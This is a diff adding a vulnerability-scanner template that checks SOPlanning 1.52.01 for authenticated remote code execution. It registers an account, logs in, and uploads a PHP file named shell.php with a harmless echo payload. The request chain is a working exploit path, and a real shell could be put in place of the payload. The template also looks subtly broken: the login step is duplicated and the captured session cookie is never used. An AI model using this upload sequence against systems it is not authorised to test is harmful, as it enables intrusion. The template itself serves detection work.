@@ -1,0 +1,82 @@
+id: soplanning-rce
+info:
+  name: SOPlanning Authenticated RCE
+  author: soonghee2@ajou.ac.kr
+  severity: high
+  description: |
+    Detects a remote code execution vulnerability in SOPlanning version 1.52.01 through authenticated PHP file upload.
+  tags: rce, authenticated, upload, soplanning
+  references: |
+    - https://www.exploit-db.com/exploits/52082
+  cvss: |
+    score: 8.3
+    vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+
+variables:
+  username: "user1"
+  password: "user1"
+
+requests:
+  - raw:
+      - |
+        POST /process/signup.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}&email={{username}}@example.com
+
+  - raw:
+      - |
+        POST /process/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login={{username}}&password={{password}}
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=([^;]+);"
+
+  - raw:
+      - |
+        POST /process/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login={{username}}&password={{password}}
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=([^;]+);"
+
+  - raw:
+      - |
+        POST /process/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"linkid\"
+
+        test123
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"periodeid\"
+
+        0
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"type\"
+
+        upload
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"fichier-0\"; filename=\"shell.php\"
+        Content-Type: application/x-php
+
+        <?php echo 'Hello, World!'; ?>
+        ------WebKitFormBoundary--
+
+    matchers:
+      - type: status
+        status:
+          - 302
